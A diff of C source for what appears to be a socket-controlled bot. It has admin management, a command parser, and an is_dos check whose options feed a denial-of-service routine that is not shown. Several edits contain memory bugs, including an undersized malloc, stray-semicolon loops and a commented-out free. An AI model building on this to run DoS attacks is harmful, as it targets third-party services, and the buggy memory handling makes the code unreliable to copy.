@@ -70,11 +70,11 @@ int check_pass (char *pass) {
 int add_admin (pAccount a, pMessage m) {
     // check if admins are maxed out
     if (a->num_admins < UCHAR_MAX) {
-        unsigned char prev_admin_size = a->admin_size;
+        //unsigned char prev_admin_size = a->admin_size;
         // check if admin array needs to be expanded
         if (a->num_admins >= a->admin_size) {
             // expand array with realloc
-            a->admins = realloc (a->admins, sizeof (char *)*a->admin_size*2+1);
+            a->admins = realloc (a->admins, sizeof (char *)*(a->admin_size*2+1));
             if (a->admins == NULL) {
                 return FALSE;
             }
@@ -83,16 +83,18 @@ int add_admin (pAccount a, pMessage m) {
 
             // iterate through admins to NULL any unused array pointers
             int i;
-            for (i = 0; i < prev_admin_size; i++);
+            for (i = 0; i < a->num_admins; i++);
             // initialise unused array pointers to NULL
-            for (; i < a->num_admins; i++) {
+            for (; i < a->admin_size; i++) {
                 a->admins[i] = NULL;
             }
         }
         // add new admin to next available array element
         // increase number of admins by 1
         a->admins[a->num_admins++] = strdup (m->n_name);
-
+        int i;
+        for (i = 0; i < a->num_admins; i++)
+        printf ("admin[%d]: %s\n", i, a->admins[i]);
     }
 
     return TRUE;
@@ -133,8 +135,8 @@ bool is_dos (char *cmd) {
     return FALSE;
 }
 
-static thr_args *new_thr_args (SOCKET s) {
-    thr_args *ta = malloc (sizeof (*ta));
+static thd_args *new_thd_args (SOCKET s) {
+    thd_args *ta = malloc (sizeof (*ta));
 
     ta->s = s;
     ta->contact = NULL;
@@ -151,23 +153,25 @@ static thr_args *new_thr_args (SOCKET s) {
  * as arguments to dos
  * might need to clean up the
  * code so it looks better
+ * probably an array of function
+ * pointers or something
  */
 int parse_args (SOCKET s, pMessage m) {
     // array of arguments
-    char **argv = malloc (sizeof (char *)*DEFAULT_ARG_SIZE);
+    char **argv = malloc (sizeof (char *)*DEFAULT_ARG_SIZE-1);
     if (argv == NULL) {
         return FALSE;
     }
 
     int i = 0, argc;
-    char *token;
+    char *token = NULL;
     // extract command
     token = strtok (m->msg, " ");
     if (token == NULL) {
         return FALSE;
     }
 
-    argv[i++] = strdup (token);
+    argv[i++] = token;
 
     // store message elements in each argv element
     for (; i < DEFAULT_ARG_SIZE; i++) {
@@ -182,8 +186,12 @@ int parse_args (SOCKET s, pMessage m) {
     // argument count
     argc = i;
 
+    if (argc < DEFAULT_ARG_SIZE-1) {
+        return FALSE;
+    }
+
     int opt;
-    thr_args *ta = new_thr_args (s);
+    thd_args *ta = new_thd_args (s);
     ta->contact = m->contact;
 
     // parse options from message
@@ -224,12 +232,14 @@ int parse_args (SOCKET s, pMessage m) {
 #endif
 
     // there is an error here somewhere!!!
+    /*
     // free argv malloc
     for (; i > 0; i--) {
         if (argv[i] != NULL) {
             free (argv[i]);
         }
     }
+    */
     free (argv);
     free (ta);
 
